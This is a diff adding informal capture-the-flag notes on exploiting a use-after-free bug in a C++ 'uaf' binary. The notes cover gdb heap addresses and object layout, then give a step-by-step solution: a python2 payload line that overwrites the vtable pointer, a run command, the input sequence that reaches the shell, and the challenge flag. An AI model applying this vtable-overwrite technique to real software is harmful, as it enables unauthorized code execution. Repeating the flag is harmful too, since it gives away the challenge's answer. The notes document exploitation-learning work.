@@ -1,0 +1,114 @@
+OLD UAF CTF
+------------------------
+.Need to first free the 2 human class objects (case 3), then do a malloc which will point to where the 2 human class objects once had their memory allocated and overwrite those
+locations with the function address to the give_shell method (case 2), then i need to recall introduce with those old human class objects that have been deallocated and if the
+pointer to the introduce function has been rewroten by the address of the give_shell method then i would have gotten shell access (case 1)
+
+.Use after free vulnerabilities usually result from using a memory location in the heap the exact same way you did after a free as you did before a free and as a result of that
+memory now being deallocated any other memory allocation that is done during the runtime of your program can have choosen that location to allocate it's memory and if this
+new allocated memory's value can be controlled by a attacker you suddenly have a vulnerability on your hands if the previous variable who pointed to the same place on the heap
+but had it's memory freed can be abused to use the new data there for some sort of vulnerability
+
+NEW UAF CTF
+------------------------
+get input at main+277
+display options at main+255
+goal: need to call Human::give_shell()
+
+case 1 use:
+Man::introduce() method is called
+Woman::introduce() method is called
+
+int main(){
+	Man *man = new Man();
+	Women *woman = new Woman();
+	int input;
+	while (1){
+		std::cin >> input;
+		if (input ==3){
+			delete man;
+			delete woman;
+		}
+		else if (input == 2){
+			atoi(nullptr); // not nullptr but some variable that is nullptr
+		}
+		else if (input == 1){
+			man->introduce();
+			woman->introduce();		
+		}
+	}
+
+}
+.main+84 may be the new function where man is allocated???
+
+break *(main+282)
+break *(main+318)
+rbp - 0x60 is the man object
+rbp - 0x58 is the woman object
+
+man object (LSB bottom to MSB):
+
+name string
+long or int age
+vtable ptr
+
+0x404d80 address of vtable for man and start of man object
+
+=> 0x404d80 - 8 = 0x404d78 is what we need to insert to call Human::get_shell(), problem is aslr
+
+run 8000 /tmp/payload2.txt
+
+0x404d80
+0x2dfdeeb0 where man is
+0x404d80
+
+allocated 8000 bytes starting at 0x2dfdf750
+
+0x2eac1eb0 where man is before free with 0x404d80 in there
+0x2eac1eb0 after free with 0x2eac1 in there
+
+0x2061feb0 for man with 0x404d80
+0x2061fef0 for new data
+
+0x13c17eb0 for man with 0x404d80
+0x13c18750 for new data
+
+0xdfefeb0 for man
+0xdfefef0 for new data
+
+0x2032feb0 for man
+0x2032fef0 for new data
+
+0x37cf6eb0 for man
+0x37cf6ef0 for new data
+
+0x2f365eb0 for man
+
+NO FREE
+#################
+0x2d9b2eb0 for man
+0x2d9b3750 for new data
+
+
+IMMEDIATE
+#################
+0x29438eb0 for man
+0x29438ef0 for new data
+
+Solved:
+sizeof man and woman are both 48 bytes so just allocate 2 48 byte areas after freeing both man and woman to occupy the space that they were in, then fill those areas with
+a pointer to the vtable entry for man for example minus 8 which will cause the assembly to call get_shell when introduce is trying to be called, so the steps are as follows...
+
+1. create the payload with the "python2 -c "print('\x78\x4d\x40\x00\x00\x00\x00\x00'*6)" > /tmp/payload.txt" (this is the pointer to the man vtable minus 8, this is constant
+on every run probably because the lack of PIE)
+
+2. then execute uaf with the following command "./uaf 48 /tmp/payload.txt"
+
+3. then do the following sequence of commands: 3, 2, 2, 1 which will free the space man and woman are occupying with 3, then the double 2s will take that space freed with our
+payload, then 1 will call introduce thinking the heap memory stayed the same and contains the base address of the man vtable but will now contain that vtable pointer minus 8
+which will cause the wrong man method to be called (that being get_shell)
+
+4. just cat the flag which is "d3lici0us_fl4g_after_pwning"
+
+5. you have successfully pwned :)
+
